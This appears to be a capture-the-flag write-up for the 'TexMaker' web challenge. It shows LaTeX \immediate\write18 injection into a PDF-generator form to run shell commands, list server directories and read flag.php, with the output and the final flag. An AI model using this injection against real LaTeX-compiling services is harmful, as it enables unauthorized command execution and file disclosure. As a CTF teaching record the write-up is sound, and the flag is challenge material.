#TexMaker

**Category:** Web
**Points:** 90

**Description:**

Creating and using coperate templates is sometimes really hard. Luckily, we have a webinterace for creating PDF files. Some people doubt it's secure, but I reviewed the whole code and did not find any flaws.

Service: https://texmaker.ctf.internetwache.org

##TexMaker-Solution:

By viewing the given webpage, we will see a form that takes LATEX commands from us and
generate corresponded pdf to our inputs.

![Image of 1]
(./images/1.png)

This kind of stuff only ring one bell!!! Code Execution.

But how?

For solving this challenge we should find commands that let users execute shell commands.
By searching google for it, I ended up in this page: 'http://tex.stackexchange.com/questions/16790/write18-capturing-shell-script-output-as-command-variable'

For example for viewing the result of ```ls -la``` in current directory, we should use something like below in our latex file:

```
\documentclass{minimal}

\begin{document}

File listing is:

\immediate\write18{ls /usr}

\end{document}
```

As we can see by using of ```\immediate\write18``` we can execut3 any command that we want.
But remember in this injection, we doesn't need to insert \documentclass & ... in the form field.
Cause they make instructure of LATEX file and server automatically will insert this commands. So if you
insert one of those header commands, will cause error.

For exploit this task, i used this commands in form field:

```
\immediate\write18{ls -la / }
```

![Image of 2]
(./images/2.png)

It will generate a pdf for us. But when viewing the generated pdf, we can't see the outputs of 'ls -la' commands
in the pdf. After surfing a little more on this challenge and trying some other commands, I found out that
the results are shown in the debug section in the bottom of the page.
This is the result of ```ls -la``` command shown in debug section:

```
LaTeX Font Warning: Font shape `OT1/cmss/m/sc' in size <10.95> not available
(Font)              Font shape `OT1/cmr/m/sc' tried instead on input line 70.

(/usr/share/texmf/tex/latex/lm/ot1lmr.fd)
(/usr/share/texmf/tex/latex/lm/omllmm.fd)
(/usr/share/texmf/tex/latex/lm/omslmsy.fd)
(/usr/share/texmf/tex/latex/lm/omxlmex.fd)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd)
(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd)total 96
drwxr-xr-x   25 root root  4096 Feb 20 10:05 .
drwxr-xr-x   25 root root  4096 Feb 20 10:05 ..
drwxrwxr-x    2 root root  4096 Feb 19 15:37 bin
drwxr-xr-x    3 root root  4096 Feb 19 15:38 boot
drwxr-xr-x    2 root root  4096 Feb 12 01:03 command
drwxr-xr-x   16 root root  2800 Feb 20 10:05 dev
drwxr-xr-x  109 root root  4096 Feb 20 10:12 etc
drwxr-xr-x    2 root root  4096 Jan  6 16:18 home
lrwxrwxrwx    1 root root    31 Feb  3 02:40 initrd.img -> /boot/initrd.img-3.16.0-4-amd64
drwxr-xr-x   15 root root  4096 Feb 19 15:37 lib
drwxr-xr-x    2 root root  4096 Feb 17 23:14 lib64
drwx------    2 root root 16384 Feb  3 02:39 lost+found
drwxr-xr-x    3 root root  4096 Feb  3 02:39 media
drwxr-xr-x    2 root root  4096 Feb  3 02:39 mnt
drwxr-xr-x    4 root root  4096 Feb 11 03:09 opt
drwxrwxr-t    3 root root  4096 Feb 12 01:03 package
dr-xr-xr-x  115 root root     0 Feb 20 10:05 proc
drwx------    6 root root  4096 Feb 21 12:46 root
drwxr-xr-x   20 root root   700 Feb 21 06:25 run
drwxr-xr-x    2 root root  4096 Feb 19 15:37 sbin
drwxr-xr-x    2 root root  4096 Feb 12 01:06 service
drwxr-xr-x    2 root root  4096 Feb  3 02:39 srv
dr-xr-xr-x   13 root root     0 Feb 20 12:20 sys
drwxrwxrwt+   7 root root  4096 Feb 21 13:40 tmp
drwxr-xr-x   10 root root  4096 Feb  3 02:39 usr
drwxr-xr-x   12 root root  4096 Feb 11 01:44 var
lrwxrwxrwx    1 root root    27 Feb  3 02:40 vmlinuz -> boot/vmlinuz-3.16.0-4-amd64
 [1{/var/lib/texmf/fo
nts/map/pdftex/updmap/pdftex.map}] (./87d3032d814794adcb2030b15eeabc1c.aux) )</
usr/share/texlive/texmf-dist/fonts/type1/public/amsfonts/cm/cmcsc10.pfb></usr/s
hare/texlive/texmf-dist/fonts/type1/public/amsfonts/cm/cmss10.pfb></usr/share/t
exlive/texmf-dist/fonts/type1/public/amsfonts/cm/cmss12.pfb></usr/share/texlive
/texmf-dist/fonts/type1/public/amsfonts/cm/cmss17.pfb>
Output written on 87d3032d814794adcb2030b15eeabc1c.pdf (1 page, 34379 bytes).
Transcript written on 87d3032d814794adcb2030b15eeabc1c.log.
```

From now on is simple. We only need to find the flag and read it:

```
\immediate\write18{ls -la /var/www/}

drwxr-xr-x  8 root root     4096 Feb 11 02:03 .
drwxr-xr-x 12 root root     4096 Feb 11 01:44 ..
drwxr-x---  3 root web80    4096 Feb 11 02:39 0ldsk00lblog.ctf.internetwache.org
drwxr-x---  3 root web50    4096 Feb 20 15:16 mess-of-hash.ctf.internetwache.org
drwxr-x---  3 root crypto80 4096 Feb 11 02:35 procrastination.ctf.internetwache.org
drwxr-x---  3 root web60    4096 Feb 20 12:13 replace-with-grace.ctf.internetwache.org
drwxr-x---  6 root web90    4096 Feb 21 05:23 texmaker.ctf.internetwache.org
drwxr-x---  3 root web70    4096 Feb 20 15:58 the-secret-store.ctf.internetwache.org
```

```
\immediate\write18{ls -la /var/www/texmaker.ctf.internetwache.org}

drwxr-x--- 6 root web90   4096 Feb 21 05:23 .
drwxr-xr-x 8 root root    4096 Feb 11 02:03 ..
-rw-r--r-- 1 root web90   1089 Feb 11 02:52 ajax.php
drwxr-xr-x 4 root web90   4096 Feb 11 02:52 assets
-rwxr-xr-x 1 root web90    114 Feb 11 02:52 cleanpdfdir.sh
drwxrwxrwt 3 root root   32768 Feb 21 14:45 compile
-rw-r--r-- 1 root web90    279 Feb 11 02:52 config.php
-rw-r--r-- 1 root web90    279 Feb 11 02:52 config.php.sample
-rw-r--r-- 1 root web90     50 Feb 11 02:52 flag.php
-rw-r--r-- 1 root web90   2743 Feb 11 02:52 index.php
drwxrwxrwt 2 root root  618496 Feb 21 14:44 pdf
drwxr-xr-x 5 root web90   4096 Feb 11 02:52 template
```

And bammm. We see a flag.php file. lets read it:

```
\immediate\write18{cat /var/www/texmaker.ctf.internetwache.org/flag.php }

<?php
$FLAG = "IW{L4T3x_IS_Tur1ng_c0mpl3te}";
?>
```

The flag is : **IW{L4T3x_IS_Tur1ng_c0mpl3te}**
